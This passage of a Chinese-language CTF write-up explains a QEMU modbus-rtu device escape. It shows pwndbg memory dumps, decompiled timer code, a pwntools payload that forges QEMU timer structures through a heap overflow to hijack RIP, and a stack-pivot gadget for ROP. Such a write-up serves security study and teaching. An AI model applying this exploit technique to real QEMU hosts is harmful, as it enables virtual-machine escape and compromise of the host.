0c:0060│ <b>   </b> <font color="#12488B">0x555557557f00</font> —▸ <font color="#12488B">0x5555575583c8</font> —▸ <font color="#12488B">0x555557557eb0</font> —▸ <font color="#A347BA">0x5555574d40a0</font> —▸ <font color="#12488B">0x555557558380</font> ◂— ...
0d:0068│ <b>   </b> <font color="#12488B">0x555557557f08</font> —▸ <font color="#C01C28">0x555555c13703</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font>
0e:0070│ <b>   </b> <font color="#12488B">0x555557557f10</font> ◂— 0
0f:0078│ <b>   </b> <font color="#12488B">0x555557557f18</font> ◂— 0x100000000
10:0080│ <b>   </b> <font color="#12488B">0x555557557f20</font> ◂— 0
11:0088│ <b>   </b> <font color="#12488B">0x555557557f28</font> ◂— 0x81
12:0090│ <b>   </b> <font color="#12488B">0x555557557f30</font> —▸ <font color="#A347BA">0x5555574d40b0</font> —▸ <font color="#12488B">0x555557558400</font> ◂— <font color="#A347BA">0x5555574d40b0</font>
13:0098│ <b>   </b> <font color="#12488B">0x555557557f38</font> ◂— 0
</pre>

<p>在 IDA 中通过 <code>timer_init_full</code> 函数可以定位到 <code>main_loop_tlg</code> 的地址：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">timer_init_full</span><span class="params">(</span></span><br><span class="line"><span class="params">        QEMUTimer *ts,</span></span><br><span class="line"><span class="params">        QEMUTimerListGroup *timer_list_group,</span></span><br><span class="line"><span class="params">        QEMUClockType type,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> scale,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> attributes,</span></span><br><span class="line"><span class="params">        QEMUTimerCB *cb,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  QEMUTimerListGroup *timer_list_groupa; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  timer_list_groupa = timer_list_group;</span><br><span class="line">  <span class="keyword">if</span> ( !timer_list_group )</span><br><span class="line">    timer_list_groupa = &amp;main_loop_tlg;</span><br><span class="line">  ts-&gt;timer_list = timer_list_groupa-&gt;tl[type];</span><br><span class="line">  ts-&gt;cb = cb;</span><br><span class="line">  ts-&gt;opaque = opaque;</span><br><span class="line">  ts-&gt;scale = scale;</span><br><span class="line">  ts-&gt;attributes = attributes;</span><br><span class="line">  ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>main_loop_tlg</code> 类型为 <code>QEMUTimerListGroup</code>，实际上是一个 <code>QEMUTimerList</code> 指针数组：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerListGroup</span> &#123;</span></span><br><span class="line">    QEMUTimerList *tl[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调试发现其中第一项 <code>QEMUTimerList</code> 指针指向的位置与前面紧邻的 tcachebin 中 0x20 大小的空闲堆块紧邻：</p>
<pre><font color="#26A269"><b>pwndbg&gt; </b></font>telescope &dollar;rebase(0x1F80080)
00:0000│ <b>   </b> <font color="#A347BA">0x5555574d4080</font> —▸ <font color="#12488B">0x555557557eb0</font> —▸ <font color="#A347BA">0x5555574d40a0</font> —▸ <font color="#12488B">0x555557558380</font> ◂— <font color="#A347BA">0x5555574d40a0</font>
01:0008│ <b>   </b> <font color="#A347BA">0x5555574d4088</font> —▸ <font color="#12488B">0x555557557f30</font> —▸ <font color="#A347BA">0x5555574d40b0</font> —▸ <font color="#12488B">0x555557558400</font> ◂— <font color="#A347BA">0x5555574d40b0</font>
02:0010│ <b>   </b> <font color="#A347BA">0x5555574d4090</font> —▸ <font color="#12488B">0x555557557fb0</font> —▸ <font color="#A347BA">0x5555574d40c0</font> —▸ <font color="#12488B">0x555557558480</font> ◂— <font color="#A347BA">0x5555574d40c0</font>
03:0018│ <b>   </b> <font color="#A347BA">0x5555574d4098</font> —▸ <font color="#12488B">0x555557558030</font> —▸ <font color="#A347BA">0x5555574d40d0</font> —▸ <font color="#12488B">0x555557558500</font> ◂— <font color="#A347BA">0x5555574d40d0</font>
</pre>
<p>因此我们可以尝试溢出覆盖 <code>QEMUTimerList</code> 结构从而劫持程序执行流程。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = heap_base + <span class="number">0x82eb0</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload += flat(&#123;</span><br><span class="line">    <span class="number">0</span>: p64(<span class="number">0xdeaddead</span>),  <span class="comment"># QEMUClock</span></span><br><span class="line">    <span class="number">0x8</span>: flat(&#123;  <span class="comment"># QemuMutex</span></span><br><span class="line">        <span class="number">0x0</span>: flat(  <span class="comment"># lock</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __lock</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __count</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __owner</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __nusers</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __kind = PTHREAD_MUTEX_TIMED_NP (0)</span></span><br><span class="line">            p16(<span class="number">0</span>),  <span class="comment"># __spins</span></span><br><span class="line">            p16(<span class="number">0</span>),  <span class="comment"># __elision</span></span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># __list.__prev</span></span><br><span class="line">            p64(<span class="number">0</span>)  <span class="comment"># __list.__next</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x34</span>: p8(<span class="number">1</span>)  <span class="comment"># initialized</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="number">0x40</span>: p64(<span class="number">0xbeefbeef</span>)  <span class="comment"># active_timers</span></span><br><span class="line">&#125;)</span><br><span class="line">payload = payload.replace(p64(<span class="number">0xbeefbeef</span>), p64(payload_addr + <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += flat(&#123;  <span class="comment"># QEMUTimer</span></span><br><span class="line">    <span class="number">0x0</span>: p64(<span class="number">0</span>),  <span class="comment"># expire_time</span></span><br><span class="line">    <span class="number">0x10</span>: p64(<span class="number">0xdeadbeef</span>),  <span class="comment"># cb</span></span><br><span class="line">    <span class="number">0x18</span>: <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># attributes</span></span><br><span class="line">&#125;)</span><br><span class="line">payload = payload.replace(p64(<span class="number">0xdeaddead</span>), p64(payload_addr + <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += flat(&#123; <span class="comment"># QEMUClock</span></span><br><span class="line">    <span class="number">0x8</span>: p32(<span class="number">0</span>),  <span class="comment"># type</span></span><br><span class="line">    <span class="number">0xc</span>: p8(<span class="number">1</span>),  <span class="comment"># enabled</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;<span class="number">23</span>: payload&#125;,</span><br><span class="line">    filler=cyclic(<span class="number">250</span>, n=<span class="number">8</span>),</span><br><span class="line">    length=<span class="number">250</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump(payload))</span><br><span class="line"></span><br><span class="line">fc10_req(<span class="number">0</span>, (<span class="number">0x10000</span> - <span class="number">250</span> // <span class="number">2</span>), payload)  <span class="comment"># [0xff83*2,(0xff83+250/2)*2-1]=[0x1ff06,0x1ffff]</span></span><br><span class="line">fc03_req(<span class="number">0</span>, <span class="number">0x10000</span> - <span class="number">0x80</span>, <span class="number">0x80</span>)</span><br></pre></td></tr></table></figure></div>

<pre>LEGEND: <font color="#A2734C">STACK</font> | <font color="#12488B">HEAP</font> | <font color="#C01C28">CODE</font> | <font color="#A347BA">DATA</font> | <font color="#C01C28"><u style="text-decoration-style:solid">WX</u></font> | RODATA
<font color="#12488B">────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────</font>
<font color="#C01C28">*</font><font color="#C01C28"><b>RAX </b></font> 0x6161616161616161 (&apos;aaaaaaaa&apos;)
 <b>RBX </b> <font color="#A2734C">0x7fffffffec98</font> —▸ <font color="#A2734C">0x7fffffffee94</font> ◂— &apos;/home/ctf/qemu-system-x86_64&apos;
 <b>RCX </b> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>RDX </b></font> 0xdeadbeef
<font color="#C01C28">*</font><font color="#C01C28"><b>RDI </b></font> 0x6161616161616161 (&apos;aaaaaaaa&apos;)
 <b>RSI </b> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R8  </b></font> 0x13bf9aa800000
<font color="#C01C28">*</font><font color="#C01C28"><b>R9  </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R10 </b></font> 0x7ffff7fbf080
<font color="#C01C28">*</font><font color="#C01C28"><b>R11 </b></font> 0x23430a
 <b>R12 </b> 9
 <b>R13 </b> 0
 <b>R14 </b> 0x5555565b3838 —▸ <font color="#C01C28">0x55555588a750</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font>
 <b>R15 </b> <font color="#A347BA">0x7ffff7ffd000 (_rtld_global)</font> —▸ <font color="#A347BA">0x7ffff7ffe2e0</font> —▸ 0x555555554000 ◂— 0x10102464c457f
<font color="#C01C28">*</font><font color="#C01C28"><b>RBP </b></font> <font color="#A2734C">0x7fffffffea60</font> —▸ <font color="#A2734C">0x7fffffffea80</font> —▸ <font color="#A2734C">0x7fffffffeaa0</font> —▸ <font color="#A2734C">0x7fffffffeaf0</font> —▸ <font color="#A2734C">0x7fffffffeb10</font> ◂— ...
<font color="#C01C28">*</font><font color="#C01C28"><b>RSP </b></font> <font color="#A2734C">0x7fffffffea08</font> —▸ <font color="#C01C28">0x5555561820fd</font> ◂— <font color="#AFD700">mov</font><font color="#000000"> </font><font color="#5FD7FF">rax</font><font color="#000000">, </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rip</font><font color="#000000"> + </font><font color="#AF87FF">0x132862c</font><font color="#000000">]</font>
<font color="#C01C28">*</font><font color="#C01C28"><b>RIP </b></font> 0xdeadbeef
<font color="#12488B">─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────</font>
<font color="#C01C28">Invalid address 0xdeadbeef</font>











<font color="#12488B">───────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────</font>
00:0000│ <b>rsp</b> <font color="#A2734C">0x7fffffffea08</font> —▸ <font color="#C01C28">0x5555561820fd</font> ◂— <font color="#AFD700">mov</font><font color="#000000"> </font><font color="#5FD7FF">rax</font><font color="#000000">, </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rip</font><font color="#000000"> + </font><font color="#AF87FF">0x132862c</font><font color="#000000">]</font>
01:0008│-050 <font color="#A2734C">0x7fffffffea10</font> ◂— 9 /* &apos;\t&apos; */
02:0010│-048 <font color="#A2734C">0x7fffffffea18</font> —▸ <font color="#12488B">0x555557557eb0</font> —▸ <font color="#12488B">0x555557557f18</font> ◂— 0
03:0018│-040 <font color="#A2734C">0x7fffffffea20</font> —▸ 0x5555565b3838 —▸ <font color="#C01C28">0x55555588a750</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font>
04:0020│-038 <font color="#A2734C">0x7fffffffea28</font> —▸ <font color="#A347BA">0x7ffff7ffd000 (_rtld_global)</font> —▸ <font color="#A347BA">0x7ffff7ffe2e0</font> —▸ 0x555555554000 ◂— 0x10102464c457f
05:0028│-030 <font color="#A2734C">0x7fffffffea30</font> —▸ <font color="#12488B">0x555557557ef8</font> ◂— 0x000000000000ffff
06:0030│-028 <font color="#A2734C">0x7fffffffea38</font> ◂— 0x178a21f0af24
07:0038│-020 <font color="#A2734C">0x7fffffffea40</font> ◂— 0xdeadbeef
<font color="#12488B">─────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────</font>
 ► 0       0xdeadbeef None
   1   0x5555561820fd None
   2   0x5555561821b3 None
   3   0x55555618253f None
   4   0x55555617c9c8 None
   5   0x555555c4286e None
   6   0x555556088bf3 None
   7   0x555556088cb1 None
<font color="#12488B">─────────────────────────────────────────────────────[ THREADS (2 TOTAL) ]─────────────────────────────────────────────────────</font>
  ► 1   &quot;<font color="#2AA1B3">qemu-system-x86</font>&quot; <font color="#A2734C">stopped</font>: 0xdeadbeef
    2   &quot;<font color="#2AA1B3">qemu-system-x86</font>&quot; <font color="#A2734C">stopped</font>: <font color="#C01C28">0x7ffff772728d</font> &lt;<font color="#26A269"><b>syscall+29</b></font>&gt; 
<font color="#12488B">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</font>
<font color="#26A269"><b>pwndbg&gt; </b></font>
</pre>

<p>劫持程序执行流程的函数是 <code>timerlist_run_timers</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">timerlist_run_timers</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">&#123;</span><br><span class="line">  QEMUClockType type; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> progress; <span class="comment">// [rsp+1Fh] [rbp-31h]</span></span><br><span class="line">  QEMUTimer *ts; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int64_t</span> current_time; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  QEMUTimerCB *cb; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">void</span> *opaque; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  progress = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !timer_list-&gt;active_timers )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  qemu_event_reset(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">  <span class="keyword">if</span> ( timer_list-&gt;clock-&gt;enabled )</span><br><span class="line">  &#123;</span><br><span class="line">    type = timer_list-&gt;clock-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( type != QEMU_CLOCK_VIRTUAL_RT )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( type == QEMU_CLOCK_HOST &amp;&amp; !replay_checkpoint(ReplayCheckpoint::CHECKPOINT_CLOCK_HOST) )</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">LABEL_9:</span><br><span class="line">      current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);</span><br><span class="line">      qemu_mutex_lock_func(&amp;timer_list-&gt;active_timers_lock, <span class="string">&quot;../util/qemu-timer.c&quot;</span>, <span class="number">534</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ts = timer_list-&gt;active_timers;</span><br><span class="line">        <span class="keyword">if</span> ( !ts || !timer_expired_ns(ts, current_time) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( replay_mode</span><br><span class="line">          &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL</span><br><span class="line">          &amp;&amp; (ts-&gt;attributes &amp; <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">          &amp;&amp; !replay_checkpoint(ReplayCheckpoint::CHECKPOINT_CLOCK_VIRTUAL) )</span><br><span class="line">        &#123;</span><br><span class="line">          qemu_mutex_unlock_impl(&amp;timer_list-&gt;active_timers_lock, <span class="string">&quot;../util/qemu-timer.c&quot;</span>, <span class="number">550</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        timer_list-&gt;active_timers = ts-&gt;next;</span><br><span class="line">        ts-&gt;next = <span class="number">0</span>;</span><br><span class="line">        ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">        cb = ts-&gt;cb;</span><br><span class="line">        opaque = ts-&gt;opaque;</span><br><span class="line">        qemu_mutex_unlock_impl(&amp;timer_list-&gt;active_timers_lock, <span class="string">&quot;../util/qemu-timer.c&quot;</span>, <span class="number">562</span>);</span><br><span class="line">        cb(opaque); <span class="comment">// 👈 劫持程序执行流程</span></span><br><span class="line">        qemu_mutex_lock_func(&amp;timer_list-&gt;active_timers_lock, <span class="string">&quot;../util/qemu-timer.c&quot;</span>, <span class="number">564</span>);</span><br><span class="line">        progress = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      qemu_mutex_unlock_impl(&amp;timer_list-&gt;active_timers_lock, <span class="string">&quot;../util/qemu-timer.c&quot;</span>, <span class="number">568</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( replay_checkpoint(ReplayCheckpoint::CHECKPOINT_CLOCK_VIRTUAL_RT) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">out:</span><br><span class="line">  qemu_event_set(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">  <span class="keyword">return</span> progress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在伪造 <code>QEMUTimerList</code> 的时候需要特别注意以下两点：</p>
<ul>
<li><p><code>qemu_mutex_lock_func</code> 函数实际会调用到 <code>qemu_mutex_lock_impl</code> 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">qemu_mutex_lock_impl</span><span class="params">(QemuMutex *mutex, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">int</span> line)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> err; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !mutex-&gt;initialized )</span><br><span class="line">    __assert_fail(<span class="string">&quot;mutex-&gt;initialized&quot;</span>, <span class="string">&quot;../util/qemu-thread-posix.c&quot;</span>, <span class="number">0x5C</span>u, <span class="string">&quot;qemu_mutex_lock_impl&quot;</span>);</span><br><span class="line">  qemu_mutex_pre_lock(mutex, file, line);</span><br><span class="line">  err = pthread_mutex_lock(&amp;mutex-&gt;lock);</span><br><span class="line">  <span class="keyword">if</span> ( err )</span><br><span class="line">    error_exit(err, <span class="string">&quot;qemu_mutex_lock_impl&quot;</span>);</span><br><span class="line">  qemu_mutex_post_lock(mutex, file, line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>timer_list-&gt;active_timers_lock.initialized</code> 非 0。</li>
<li><code>timer_list-&gt;active_timers_lock.lock</code>  共 0x28 字节的数据需要全 0，否则 <code>pthread_mutex_lock</code> 返回的 <code>err</code> 非 0.</li>
</ul>
</li>
<li><p><code>timer_expired_ns</code> 的 <code>expire_time</code> 需要设置为 0：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">timer_expired_ns</span><span class="params">(QEMUTimer *timer_head, <span class="type">int64_t</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> timer_head &amp;&amp; current_time &gt;= timer_head-&gt;expire_time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>否则会提前跳出循环。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ts = timer_list-&gt;active_timers;</span><br><span class="line"><span class="keyword">if</span> ( !ts || !timer_expired_ns(ts, current_time) )</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在劫持程序执行流的时候，<code>rax</code> 和 <code>rdi</code> 寄存器是可控的，我们可以使用下面这个 gadget 将栈迁移到我们可控的内存上，然后执行 ROP：</p>
<pre> ► <font color="#26A269"><b>0x555555c5dc51</b></font> <font color="#26A269"><b>                        </b></font>   <font color="#AFD700"><b>push</b></font><font color="#000000"><b>   </b></font><font color="#5FD7FF"><b>rax</b></font>
   0x555555c5dc52                            <font color="#AFD700">add</font><font color="#000000">    </font><font color="#5FD7FF">byte</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rax</font><font color="#000000"> - </font><font color="#AF87FF">0x75</font><font color="#000000">], </font><font color="#5FD7FF">cl</font>     [<font color="#12488B">0x555557557eab</font>] &lt;= 0x61 (0x61 + 0x0)
   0x555555c5dc55                            <font color="#AFD700">pop</font><font color="#000000">    </font><font color="#5FD7FF">rbp</font>                           <font color="#C01C28"><b>RBP</b></font> =&gt; <font color="#12488B">0x555557557f20</font>
   0x555555c5dc56                            <font color="#AFD700">clc</font><font color="#000000">    </font>
   0x555555c5dc57                            <font color="#AFD700">leave</font><font color="#000000">  </font>
   0x555555c5dc58                            <font color="#AFD700">xor</font><font color="#000000">    </font><font color="#5FD7FF">eax</font><font color="#000000">, </font><font color="#5FD7FF">eax</font>                      <font color="#C01C28"><b>EAX</b></font> =&gt; 0
   0x555555c5dc5a                            <font color="#AFD700">xor</font><font color="#000000">    </font><font color="#5FD7FF">edx</font><font color="#000000">, </font><font color="#5FD7FF">edx</font>                      <font color="#C01C28"><b>EDX</b></font> =&gt; 0
   0x555555c5dc5c                            <font color="#AFD700">xor</font><font color="#000000">    </font><font color="#5FD7FF">ecx</font><font color="#000000">, </font><font color="#5FD7FF">ecx</font>                      <b>ECX</b> =&gt; 0
   0x555555c5dc5e                            <font color="#AFD700">xor</font><font color="#000000">    </font><font color="#5FD7FF">esi</font><font color="#000000">, </font><font color="#5FD7FF">esi</font>                      <b>ESI</b> =&gt; 0
   0x555555c5dc60                            <font color="#AFD700">xor</font><font color="#000000">    </font><font color="#5FD7FF">edi</font><font color="#000000">, </font><font color="#5FD7FF">edi</font>                      <font color="#C01C28"><b>EDI</b></font> =&gt; 0
   0x555555c5dc62                            <font color="#AFD700"><b>ret</b></font><font color="#000000">    </font>                            &lt;<font color="#C01C28">__spawnix+875</font>&gt;
    ↓
   0x7ffff770f78b &lt;__spawnix+875&gt;            <font color="#AFD700">pop</font><font color="#000000">    </font><font color="#5FD7FF">rdi</font>          <font color="#C01C28"><b>RDI</b></font> =&gt; 0xa
   0x7ffff770f78c &lt;__spawnix+876&gt;            <font color="#AFD700"><b>ret</b></font><font color="#000000">    </font>                            &lt;<font color="#C01C28">eval_expr_multdiv+157</font>&gt;
</pre>


<p>至于如何回显数据，TCP 服务器“监听”和“已建立连接”用的是<strong>两套不同的 socket</strong>：</p>
<ul>
<li>监听阶段：进程先 <code>socket()</code> → <code>bind()</code> → <code>listen()</code>，得到<strong>一个监听 FD</strong>（只用于排队新连接，不传数据）。</li>
<li>建连后：当有客户端进来，内核在监听 socket 的基础上<strong>克隆出一个全新的连接 socket</strong>放到 accept 队列，进程 <code>accept()</code> 得到<strong>新的 FD</strong>（用于和这个客户端收发数据）。监听 FD 仍然保留，用来继续接其它连接。</li>
</ul>
<p>在这道题目中：</p>
<pre>ctf@7646de6860b3:~&dollar; ps -aux|grep qemu
ctf        170  0.0  1.5 509920 24296 pts/0    Sl   10:49   0:00 ./<font color="#C01C28"><b>qemu</b></font>-system-x86_64 -machine none -nographic -nodefaults -chardev socket,id=mbus,host=0.0.0.0,port=1502,server=on,wait=off -device modbus-rtu,chardev=mbus,unit-id=1
ctf        175  0.0  0.1   3528  1724 pts/3    S+   10:49   0:00 grep --color=auto <font color="#C01C28"><b>qemu</b></font>
ctf@7646de6860b3:~&dollar; ls -al /proc/170/fd
total 0
dr-x------ 2 ctf ctf 11 Oct 30 10:49 <font color="#12488B"><b>.</b></font>
dr-xr-xr-x 9 ctf ctf  0 Oct 30 10:49 <font color="#12488B"><b>..</b></font>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>0</b></font> -&gt; <span style="background-color:#171421"><font color="#A2734C"><b>/dev/pts/0</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>1</b></font> -&gt; <span style="background-color:#171421"><font color="#A2734C"><b>/dev/pts/0</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>10</b></font> -&gt; <font color="#A347BA"><b>&apos;socket:[274261]&apos;</b></font>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>2</b></font> -&gt; <span style="background-color:#171421"><font color="#A2734C"><b>/dev/pts/0</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>3</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[eventpoll]&apos;</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>4</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[eventfd]&apos;</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>5</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[signalfd]&apos;</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>6</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[eventpoll]&apos;</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>7</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[eventfd]&apos;</b></font></span>
